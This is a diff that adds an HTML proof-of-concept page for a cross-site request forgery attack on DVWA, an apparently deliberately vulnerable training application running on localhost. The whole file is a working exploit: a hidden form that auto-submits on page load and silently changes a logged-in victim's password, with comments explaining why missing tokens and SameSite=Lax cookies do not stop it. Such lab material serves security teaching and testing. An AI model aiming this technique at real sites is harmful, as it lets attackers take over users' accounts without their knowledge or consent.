@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>DVWA CSRF PoC — Forged Password Change</title>
+</head>
+<body>
+    <h1>Malicious Page (CSRF PoC)</h1>
+
+    <p>
+        This page silently forges a state-changing request against the
+        DVWA Low-security CSRF module. If the victim is logged in to
+        DVWA in this browser, their password is changed without consent.
+    </p>
+
+    <!--
+        DVWA Low CSRF handler accepts a plain GET request:
+        /vulnerabilities/csrf/?password_new=...&password_conf=...&Change=Change
+        No CSRF token, no current-password check, no Origin/Referer check.
+
+        A top-level GET form submission is a navigation, so even
+        SameSite=Lax session cookies are attached cross-site.
+        (An <img>/fetch variant would be blocked by Lax — see README.)
+    -->
+    <form id="csrf-form"
+          action="http://127.0.0.1:4280/vulnerabilities/csrf/"
+          method="GET">
+        <input type="hidden" name="password_new"  value="9083">
+        <input type="hidden" name="password_conf" value="9083">
+        <input type="hidden" name="Change"        value="Change">
+        <noscript><button type="submit">Click here</button></noscript>
+    </form>
+
+    <p>Submitting forged request&hellip; you should see DVWA respond with
+       <em>&ldquo;Password Changed.&rdquo;</em></p>
+
+    <script>
+        // Auto-submit on page load: no victim interaction required.
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
